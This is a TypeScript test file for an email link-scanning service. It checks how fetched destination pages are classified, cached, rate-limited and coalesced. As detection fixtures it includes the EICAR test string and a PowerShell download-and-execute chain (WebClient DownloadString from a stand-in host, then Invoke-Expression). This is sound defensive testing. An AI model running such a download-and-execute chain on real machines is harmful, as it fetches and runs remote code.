import { describe, expect, it, vi } from "vitest";
import type { CanonicalEnvelope, LinkInfo } from "../../server/src/canonical/envelope.js";
import {
  createDestinationAnalysisCoordinator,
  type DestinationFetch,
} from "../../server/src/workflows/analyzeLinks.js";

function link(url: string): LinkInfo {
  return {
    visibleText: "Open",
    rawUrl: url,
    normalizedUrl: url,
    claimedBrand: null,
    brandDomainMismatch: null,
  };
}

function envelope(urls: string[]): CanonicalEnvelope {
  return {
    provider: "gmail",
    accountProof: "account-proof",
    messageId: "message-id",
    providerNativeId: "native-id",
    folder: "inbox",
    providerFolderName: "INBOX",
    from: { displayName: "Sender", address: "sender@example.test", domain: "example.test" },
    replyTo: null,
    subject: "Analyze these destinations",
    date: new Date(0).toISOString(),
    authentication: { spf: "pass", dkim: "pass", dmarc: "pass", arc: "none" },
    textPreview: "Open the links.",
    htmlSignals: null,
    links: urls.map(link),
    attachments: [],
    listHeaders: { listId: null, listUnsubscribe: null, listUnsubscribePost: null },
    threadContext: { isFirstContact: true, threadContinuityBroken: false, replyToChangedMidThread: false },
    parseStatus: "complete",
    parseNotes: [],
    diagnostics: {
      fetchedAt: new Date(0).toISOString(),
      sizeBytes: 400,
      encoding: "plain",
      contentCoverage: "complete",
    },
  };
}

function fetched(url: string, body = "<html>ordinary page</html>") {
  return { finalUrl: url, contentType: "text/html", body };
}

describe("destination-analysis coordinator", () => {
  it("uses bounded parallel workers, preserves input order and escalates credential traps", async () => {
    let active = 0;
    let maximumActive = 0;
    const fetchImpl = vi.fn(async (url: string) => {
      active += 1;
      maximumActive = Math.max(maximumActive, active);
      await new Promise((resolve) => setTimeout(resolve, 2));
      active -= 1;
      return fetched(url, url.endsWith("/3") ? "<form><input type=password></form>" : "ordinary");
    });
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      concurrency: 3,
      maxQueue: 20,
      cacheKey: Buffer.alloc(32, 1),
    });
    const urls = Array.from({ length: 12 }, (_, index) => `https://destination-${index}.example.test/${index}`);

    const result = await coordinator.analyze(envelope(urls));

    expect(maximumActive).toBe(3);
    expect(result.results.map((entry) => entry.url)).toEqual(urls);
    expect(result.results[3]?.classification).toBe("credential_trap");
    expect(result.escalatedToHighRisk).toBe(true);
    expect(coordinator.telemetry()).toMatchObject({
      activeWorkers: 0,
      queuedJobs: 0,
      inFlightDestinations: 0,
      cachedDestinations: 12,
    });
  });

  it("classifies actual fetched malicious text as malware and keeps ordinary text benign without executing either", async () => {
    const malicious = "https://malicious-content.example.test/payload";
    const benign = "https://ordinary-content.example.test/help";
    const eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    const fetchImpl = vi.fn(async (url: string) => fetched(
      url,
      url === malicious
        ? `<html><body><pre>${eicar}</pre></body></html>`
        : "<html><body>Administrator documentation discusses safe software updates and account help.</body></html>",
    ));
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      cacheKey: Buffer.alloc(32, 8),
    });

    const result = await coordinator.analyze(envelope([malicious, benign]));

    expect(result.results[0]).toMatchObject({
      classification: "malware",
      hasPasswordField: false,
    });
    expect(result.results[0]?.detail).toMatch(/never executed/i);
    expect(result.results[1]?.classification).toBe("benign");
    expect(result.escalatedToHighRisk).toBe(true);
  });

  it("classifies a deterministic PowerShell download/decode/execute chain as malware without relying on URL reputation", async () => {
    const url = "https://unknown-hash.example.test/content";
    const body = [
      "<html><body><pre>",
      "powershell.exe -EncodedCommand SQBFAFgA",
      "$wc = New-Object Net.WebClient",
      "$payload = $wc.DownloadString('https://payload.invalid/a')",
      "Invoke-Expression $payload",
      "</pre></body></html>",
    ].join("\n");
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl: vi.fn(async () => fetched(url, body)),
      cacheKey: Buffer.alloc(32, 9),
    });

    const result = await coordinator.analyze(envelope([url]));
    expect(result.results[0]?.classification).toBe("malware");
    expect(result.escalatedToHighRisk).toBe(true);
  });

  it("coalesces simultaneous identical destinations and serves later calls from the shared cache", async () => {
    const fetchImpl = vi.fn(async (url: string) => {
      await new Promise((resolve) => setTimeout(resolve, 2));
      return fetched(url);
    });
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      cacheKey: Buffer.alloc(32, 2),
    });
    const repeated = envelope(Array.from({ length: 100 }, () => "https://same.example.test/private?token=secret"));

    const first = await coordinator.analyze(repeated);
    const second = await coordinator.analyze(repeated);

    expect(fetchImpl).toHaveBeenCalledTimes(1);
    expect(first.results).toHaveLength(100);
    expect(second.results).toHaveLength(100);
    expect(coordinator.telemetry()).toMatchObject({
      cacheHits: 100,
      cacheMisses: 1,
      coalescedRequests: 99,
      cachedDestinations: 1,
    });
    expect(JSON.stringify(coordinator.telemetry())).not.toContain("token=secret");
  });

  it("uses fixed retention rather than extending cache lifetime on reads", async () => {
    let now = 1_000;
    const fetchImpl = vi.fn(async (url: string) => fetched(url));
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      cacheTtlMs: 100,
      errorCacheTtlMs: 20,
      now: () => now,
      cacheKey: Buffer.alloc(32, 3),
    });
    const message = envelope(["https://expiry.example.test/path"]);

    await coordinator.analyze(message);
    now = 1_050;
    await coordinator.analyze(message);
    now = 1_101;
    await coordinator.analyze(message);

    expect(fetchImpl).toHaveBeenCalledTimes(2);
    expect(coordinator.telemetry().cachedDestinations).toBe(1);
  });

  it("retains failed acquisition only for the shorter error TTL", async () => {
    let now = 10_000;
    const fetchImpl = vi.fn<DestinationFetch>(async () => null);
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      cacheTtlMs: 1_000,
      errorCacheTtlMs: 25,
      now: () => now,
      cacheKey: Buffer.alloc(32, 4),
    });
    const message = envelope(["https://failure.example.test/path"]);

    expect((await coordinator.analyze(message)).results[0]?.classification).toBe("error");
    now += 20;
    await coordinator.analyze(message);
    now += 6;
    await coordinator.analyze(message);

    expect(fetchImpl).toHaveBeenCalledTimes(2);
  });

  it("fails excess work closed when the bounded queue is full", async () => {
    const fetchImpl = vi.fn(async (url: string) => {
      await new Promise((resolve) => setTimeout(resolve, 10));
      return fetched(url);
    });
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      concurrency: 1,
      maxQueue: 2,
      cacheKey: Buffer.alloc(32, 5),
    });
    const message = envelope(Array.from({ length: 6 }, (_, index) => `https://capacity-${index}.example.test/`));

    const result = await coordinator.analyze(message);

    expect(fetchImpl).toHaveBeenCalledTimes(3);
    expect(result.results.filter((entry) => entry.detail.includes("capacity is currently exhausted"))).toHaveLength(3);
    expect(result.results.every((entry) => entry.classification === "benign" || entry.classification === "error")).toBe(true);
    expect(coordinator.telemetry().rejectedJobs).toBe(3);
  });

  it("evicts least-recently-used entries and never exceeds the cache budget", async () => {
    const fetchImpl = vi.fn(async (url: string) => fetched(url));
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      maxCacheEntries: 3,
      cacheKey: Buffer.alloc(32, 6),
    });
    const first = "https://first.example.test/";
    const second = "https://second.example.test/";

    await coordinator.analyze(envelope([first, second, "https://third.example.test/"]));
    await coordinator.analyze(envelope([first]));
    await coordinator.analyze(envelope(["https://fourth.example.test/"]));
    await coordinator.analyze(envelope([second]));

    expect(coordinator.telemetry()).toMatchObject({ cachedDestinations: 3, evictedEntries: 2 });
    expect(fetchImpl).toHaveBeenCalledTimes(5);
  });

  it("coalesces a 10,000-client burst without duplicate outbound inflation", async () => {
    const fetchImpl = vi.fn(async (url: string) => {
      await Promise.resolve();
      return fetched(url);
    });
    const coordinator = createDestinationAnalysisCoordinator({
      fetchImpl,
      cacheKey: Buffer.alloc(32, 7),
    });
    const message = envelope(["https://shared-campaign.example.test/open"]);

    const results = await Promise.all(
      Array.from({ length: 10_000 }, () => coordinator.analyze(message)),
    );

    expect(results).toHaveLength(10_000);
    expect(fetchImpl).toHaveBeenCalledTimes(1);
    expect(coordinator.telemetry()).toMatchObject({
      coalescedRequests: 9_999,
      rejectedJobs: 0,
      cachedDestinations: 1,
    });
  });
});
